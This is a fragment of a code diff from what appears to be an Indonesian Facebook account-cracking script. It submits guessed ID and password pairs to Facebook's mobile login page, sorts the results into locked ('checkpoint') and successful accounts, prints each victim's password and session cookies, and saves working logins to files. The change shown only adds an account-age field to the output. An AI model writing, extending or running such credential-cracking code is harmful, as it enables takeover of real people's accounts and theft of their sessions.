@@ -1540,7 +1540,7 @@ def reguler(idf,pwv):
             po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
                 print('\n')
-                print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
+                print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] TAHUN   : {cektahun(idf)}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
                 os.popen('play-audio c.mp3')
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf+'|'+pw)
@@ -1550,7 +1550,7 @@ def reguler(idf,pwv):
                 ok+=1
                 print('\n')
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
+                print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN   : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
                 os.popen('play-audio o.mp3')
                 open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                 break
